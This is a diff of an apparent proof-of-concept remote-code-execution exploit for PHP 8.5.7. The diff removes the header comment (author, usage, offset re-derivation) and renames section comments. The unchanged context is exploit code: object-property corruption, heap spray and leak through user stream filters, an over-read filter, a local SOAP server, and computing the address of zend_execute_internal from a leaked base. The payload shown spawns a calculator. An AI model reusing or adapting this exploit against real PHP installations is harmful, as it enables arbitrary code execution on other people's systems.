@@ -1,25 +1,4 @@
 <?php
-/**
- * PHP 8.5.7 — StreamBucket/SoapClient RCE — Calculator PoC
- *
- * Minimal self-contained proof that demonstrates code execution by
- * launching a calculator process (xcalc on Linux, calc.exe on Windows).
- *
- * Author  : sn0x-sharma (Sanket Sharma)
- * GitHub  : https://github.com/sn0x-sharma
- * Contact : sanketsharmacsec@gmail.com
- *
- * Usage:
- *   php calc_poc.php
- *
- * Expected output on success:
- *   [✓] CALC SPAWNED — RCE confirmed on PHP <version>
- *   <calculator process appears>
- *
- * Build-specific offsets for PHP 8.5.7 x86_64 Linux.
- * Re-derive with:
- *   nm -D $(which php8.5) | grep -E 'zend_execute_internal|zif_system'
- */
 
 declare(strict_types=1);
 error_reporting(E_ALL & ~E_DEPRECATED);
@@ -38,8 +17,6 @@ echo "[*] Target command: $CALC_CMD\n\n";
 if (!class_exists(SoapClient::class)) {
     fwrite(STDERR, "[!] SOAP extension required\n"); exit(1);
 }
-
-// ── Primitives ────────────────────────────────────────────────────────────────
 
 function corrupt_property(object $o, string $p, mixed $v): void {
     $it = new ArrayIterator($o);
@@ -110,7 +87,7 @@ function find_mask(int $arData, int $lo32): array {
     throw new RuntimeException('No compatible hash slot found');
 }
 
-// ── Filter: spray + leak ──────────────────────────────────────────────────────
+// Filter: spray + leak ──────────────────────────────────────────────────────
 
 final class CalcLeakFilter extends php_user_filter {
     public static int    $victimLen  = 262144;
@@ -138,7 +115,7 @@ final class CalcLeakFilter extends php_user_filter {
     }
 }
 
-// ── Filter: overread ─────────────────────────────────────────────────────────
+// Filter: overread ─────────────────────────────────────────────────────────
 
 final class CalcOverreadFilter extends php_user_filter {
     public static int   $ptr   = 0;
@@ -157,7 +134,7 @@ final class CalcOverreadFilter extends php_user_filter {
     }
 }
 
-// ── SOAP server ───────────────────────────────────────────────────────────────
+// SOAP server ───────────────────────────────────────────────────────────────
 
 function calc_server(int $port, string $rp, string $cp, string $cn): never {
     $srv = stream_socket_server("tcp://127.0.0.1:$port", $eno, $es);
@@ -209,7 +186,7 @@ function start_calc_server(string $cp, string $cn): array {
     throw new RuntimeException('server start failed');
 }
 
-// ── Main ─────────────────────────────────────────────────────────────────────
+// Main ─────────────────────────────────────────────────────────────────────
 
 $base   = php_base();
 $zei    = $base + ZEND_EXECUTE_INTERNAL_OFF;
